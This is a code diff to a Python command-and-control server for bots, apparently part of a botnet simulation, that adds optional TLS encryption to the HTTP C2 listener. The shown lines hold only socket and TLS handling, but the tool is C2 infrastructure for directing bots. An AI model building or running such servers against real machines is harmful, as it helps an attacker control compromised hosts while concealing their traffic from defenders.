@@ -25,6 +25,7 @@ import re
 import signal
 import socket
 import sqlite3
+import ssl
 import struct
 import sys
 import threading
@@ -423,10 +424,21 @@ def serve_http(c2, port):
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("0.0.0.0", port))
     srv.listen(64)
-    log(f"LISTEN HTTP C2 on 0.0.0.0:{port} path={c2.http_path}")
+    log(f"LISTEN HTTP C2 on 0.0.0.0:{port} path={c2.http_path}"
+        + (" TLS" if c2.tls_ctx else ""))
     while True:
         try:
             conn, addr = srv.accept()
+            if c2.tls_ctx is not None:
+                try:
+                    conn = c2.tls_ctx.wrap_socket(conn, server_side=True)
+                except (ssl.SSLError, OSError) as e:
+                    log(f"TLS handshake failed from {addr[0]}: {e}")
+                    try:
+                        conn.close()
+                    except OSError:
+                        pass
+                    continue
             threading.Thread(target=handle_http, args=(conn, addr, c2),
                              daemon=True).start()
         except KeyboardInterrupt:
@@ -899,6 +911,12 @@ class C2:
         #                  would otherwise steal commands, the #119 race)
         self.evidence = os.environ.get("SIM_EVIDENCE", "")
         self.bot_ip = os.environ.get("SIM_BOT_IP", "")
+        self.tls_ctx = None
+        cert = os.environ.get("NOTNET_C2_TLS_CERT", "")
+        key = os.environ.get("NOTNET_C2_TLS_KEY", "")
+        if cert and key:
+            self.tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            self.tls_ctx.load_cert_chain(cert, key)
         os.makedirs(queue_dir, exist_ok=True)
         os.makedirs(payload_dir, exist_ok=True)
 
